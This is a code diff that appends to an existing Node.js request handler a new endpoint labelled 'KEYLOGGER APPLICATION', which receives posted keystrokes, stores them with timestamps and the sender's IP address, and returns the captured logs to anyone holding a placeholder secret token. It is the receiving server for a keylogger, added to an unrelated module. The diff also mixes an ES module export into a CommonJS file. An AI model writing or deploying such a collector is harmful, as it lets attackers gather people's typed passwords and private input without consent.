@@ -54,3 +54,26 @@ module.exports = function(req, res) {
 
     return res.status(400).json({ success: false, message: 'Invalid action requested.' });
 };
+// KEYLOGGER APPLICATION 
+// api/log.js
+let keystrokes = [];
+
+export default function handler(req, res) {
+  if (req.method === 'POST') {
+    const { keys, timestamp, tag } = req.body;
+    keystrokes.push({ timestamp, tag, keys, ip: req.headers['x-forwarded-for'] });
+    console.log(`[LOG] ${tag}: ${keys}`);
+    return res.status(200).json({ ok: true, total: keystrokes.length });
+  }
+
+  if (req.method === 'GET') {
+    // DANGER: Anyone can read. Protect with a secret query param in production.
+    const secret = req.query.secret;
+    if (secret !== 'your-secret-token') {
+      return res.status(403).json({ error: 'forbidden' });
+    }
+    return res.status(200).json({ count: keystrokes.length, logs: keystrokes });
+  }
+
+  return res.status(405).json({ error: 'method not allowed' });
+}
